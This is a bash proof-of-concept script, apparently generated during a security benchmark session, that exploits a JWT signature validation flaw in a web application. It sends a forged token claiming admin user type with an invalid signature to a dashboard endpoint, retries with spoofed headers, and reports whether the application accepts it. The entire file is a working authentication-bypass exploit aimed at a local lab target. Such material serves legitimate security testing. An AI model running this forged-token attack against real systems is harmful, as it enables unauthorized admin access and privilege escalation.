#!/bin/bash
# POC: Tests JWT signature validation bypass with forged token, handles redirects and authentication flow
# Target: ./repo
# Created: 2025-11-04T14:48:22.916Z
# Session: benchmark-XBEN-027-24-mhknopkv

# JWT Signature Validation Bypass POC - Version 3
# Tests JWT signature validation by attempting to access protected endpoint with forged token
# Follows redirects to handle authentication flow

set -e

TARGET_URL="${1:-http://localhost:8080}"
DASHBOARD_ENDPOINT="${TARGET_URL}/dashboard"

echo "[*] JWT Signature Validation Bypass POC - Version 3"
echo "[*] Target: ${TARGET_URL}"
echo ""

# The forged JWT with invalid signature
FORGED_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJ1c2VyX2lkIjoxMDAzMiwidXNlcl90eXBlIjoiYWRtaW4ifQ.INVALIDSIGNATURE"

echo "[*] Forged JWT token (invalid signature): "
echo "    ${FORGED_TOKEN:0:60}..."
echo ""

echo "[*] JWT Payload Claims:"
PAYLOAD_B64=$(echo "$FORGED_TOKEN" | cut -d'.' -f2)
PADDING=$((4 - ${#PAYLOAD_B64} % 4))
if [ $PADDING -ne 4 ]; then
    PAYLOAD_B64="${PAYLOAD_B64}$(printf '%*s' $PADDING | tr ' ' '=')"
fi
echo "$PAYLOAD_B64" | base64 -d 2>/dev/null | head -c 200
echo ""
echo ""

echo "[*] Step 1: Testing forged JWT token without valid session cookie..."
echo "[*] Sending request with ONLY the forged auth_token cookie..."
RESPONSE1=$(curl -s -L -c /tmp/jwt_test_cookies.txt -b "auth_token=${FORGED_TOKEN}" "${DASHBOARD_ENDPOINT}" \
  -w "\n%{http_code}")

HTTP_CODE1=$(echo "$RESPONSE1" | tail -n 1)
BODY1=$(echo "$RESPONSE1" | head -n -1)

echo "[*] First attempt HTTP Response Code: ${HTTP_CODE1}"
echo ""

# If we get 302 or 401, it means we're not authenticated
# Let's check if we can find a way to test with a valid session
if [ "$HTTP_CODE1" = "302" ] || [ "$HTTP_CODE1" = "301" ]; then
    echo "[*] Got redirect - the app requires proper authentication setup"
    echo "[*] Attempting alternative test with Referer and User-Agent..."
    echo ""
    
    # Try with additional headers that might bypass authentication checks
    RESPONSE2=$(curl -s -L -c /tmp/jwt_test_cookies.txt \
      -b "auth_token=${FORGED_TOKEN}" \
      -H "Referer: ${TARGET_URL}/" \
      -H "User-Agent: Mozilla/5.0" \
      "${DASHBOARD_ENDPOINT}" \
      -w "\n%{http_code}")
    
    HTTP_CODE2=$(echo "$RESPONSE2" | tail -n 1)
    BODY2=$(echo "$RESPONSE2" | head -n -1)
    
    echo "[*] Second attempt HTTP Response Code: ${HTTP_CODE2}"
    echo "[*] Response preview:"
    echo "$BODY2" | head -c 300
    echo ""
    echo ""
    
    # Check response for success indicators
    if [ "$HTTP_CODE2" = "200" ]; then
        echo "[+] VULNERABILITY CONFIRMED!"
        echo "[+] The application accepted the forged JWT with invalid signature!"
        exit 0
    elif echo "$BODY2" | grep -q "Welcome\|Dashboard\|Admin" 2>/dev/null; then
        echo "[+] VULNERABILITY CONFIRMED!"
        echo "[+] Application accepted forged JWT token (contains welcome message)"
        exit 0
    else
        echo "[-] Could not confirm vulnerability - application requires proper session setup"
        echo "[*] This may indicate the test environment needs initialization"
        exit 1
    fi
elif [ "$HTTP_CODE1" = "200" ]; then
    echo "[+] VULNERABILITY CONFIRMED!"
    echo "[+] The application accepted a JWT token with an INVALID signature!"
    echo ""
    echo "[*] Response indicates successful authentication with forged token:"
    echo "$BODY1" | head -c 200
    echo ""
    exit 0
else
    echo "[*] HTTP Response Code: ${HTTP_CODE1}"
    echo "[*] Response Body:"
    echo "$BODY1"
    echo ""
    echo "[?] Unable to confirm JWT signature bypass from response"
    exit 1
fi